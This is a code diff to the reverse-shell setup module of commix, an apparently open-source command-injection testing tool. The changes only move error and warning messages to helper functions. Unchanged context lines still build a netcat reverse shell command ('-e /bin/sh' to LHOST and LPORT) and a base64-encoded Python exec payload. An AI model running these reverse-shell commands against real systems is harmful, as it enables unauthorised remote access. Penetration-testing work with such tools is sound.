@@ -30,8 +30,9 @@ def check_lhost(lhost):
     settings.LHOST = lhost
     print "LHOST => " + settings.LHOST
     return True
-  else: 
-    print Back.RED + settings.ERROR_SIGN + "The IP format is not valid." + Style.RESET_ALL + "\n"
+  else:
+    err_msg = "The IP format is not valid."
+    print settings.print_error_msg(err_msg) + "\n"
     return False
 
 """
@@ -44,7 +45,8 @@ def check_lport(lport):
       print "LPORT => " + settings.LPORT
       return True
   except ValueError:
-    print Back.RED + settings.ERROR_SIGN + "The port must be numeric." + Style.RESET_ALL + "\n"
+    err_msg = "The port must be numeric."
+    print settings.print_error_msg(err_msg) + "\n"
     return False
 
 
@@ -82,7 +84,8 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_AL
       nc_alternative = NETCAT_ALTERNATIVES[2]
       break
     elif nc_version.lower() == "reverse_tcp": 
-      print Fore.YELLOW + settings.WARNING_SIGN + "You are already into the 'reverse_tcp' mode." + Style.RESET_ALL 
+      warn_msg = "You are already into the 'reverse_tcp' mode."
+      print settings.print_warning_msg(warn_msg)
       continue
     elif nc_version.lower() == "?": 
       menu.shell_options()
@@ -94,8 +97,9 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_AL
         check_lhost(nc_version[10:])
       if nc_version[4:9].lower() == "lport":
         check_lport(nc_version[10:])
-    else:  
-      print Back.RED + settings.ERROR_SIGN + "The '" + nc_version + "' option, is not valid." + Style.RESET_ALL
+    else:
+      err_msg = "The '" + nc_version + "' option, is not valid."  
+      print settings.print_error_msg(err_msg)
       continue
 
   cmd = nc_alternative + " " + settings.LHOST + " " + settings.LPORT + " -e /bin/sh"
@@ -189,8 +193,9 @@ exec(d,{'s':s})"""
       else:
         other_shell = "python -c \"exec('" +other_shell+ "'.decode('base64'))\""
       break
-    elif other_shell.lower() == "reverse_tcp": 
-      print Fore.YELLOW + settings.WARNING_SIGN + "You are already into the 'reverse_tcp' mode." + Style.RESET_ALL 
+    elif other_shell.lower() == "reverse_tcp":
+      warn_msg = "You are already into the 'reverse_tcp' mode."
+      print settings.print_warning_msg(warn_msg)
       continue
     elif other_shell.lower() in settings.SHELL_OPTIONS:
       return other_shell
@@ -201,8 +206,9 @@ exec(d,{'s':s})"""
         check_lport(other_shell[10:])
     elif other_shell.lower() == "quit": 
       sys.exit(0)
-    else:  
-      print Back.RED + settings.ERROR_SIGN + "The '" + other_shell + "' option, is not valid." + Style.RESET_ALL
+    else:
+      err_msg = "The '" + other_shell + "' option, is not valid."  
+      print settings.print_error_msg(err_msg)
       continue
 
   return other_shell
@@ -228,7 +234,8 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """
       reverse_tcp_option = other_reverse_shells()
       break
     elif reverse_tcp_option.lower() == "reverse_tcp": 
-      print Fore.YELLOW + settings.WARNING_SIGN + "You are already into the 'reverse_tcp' mode." + Style.RESET_ALL 
+      warn_msg = "You are already into the 'reverse_tcp' mode."
+      print settings.print_warning_msg(warn_msg)
       continue
     elif reverse_tcp_option.lower() == "?": 
       menu.shell_options()
@@ -243,7 +250,8 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """
       if reverse_tcp_option[4:9].lower() == "lport":
         check_lport(reverse_tcp_option[10:])
     else:
-      print Back.RED + settings.ERROR_SIGN + "The '" + reverse_tcp_option + "' option, is not valid." + Style.RESET_ALL
+      err_msg = "The '" + reverse_tcp_option + "' option, is not valid."
+      print settings.print_error_msg(err_msg)
       continue
 
   return reverse_tcp_option
@@ -256,7 +264,8 @@ def configure_reverse_tcp():
   while True:
     option = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
     if option.lower() == "reverse_tcp": 
-      print Fore.YELLOW + settings.WARNING_SIGN + "You are already into the 'reverse_tcp' mode." + Style.RESET_ALL + "\n"
+      warn_msg = "You are already into the 'reverse_tcp' mode."
+      print settings.print_warning_msg(warn_msg)+ "\n"
       continue
     elif option.lower() == "?": 
       menu.shell_options()
@@ -284,7 +293,8 @@ def configure_reverse_tcp():
       settings.REVERSE_TCP = False   
       break 
     else:
-      print Back.RED + settings.ERROR_SIGN + "The '" + option + "' option, is not valid." + Style.RESET_ALL + "\n"
+      err_msg = "The '" + option + "' option, is not valid."
+      print settings.print_error_msg(err_msg) + "\n"
       pass
 
 # eof
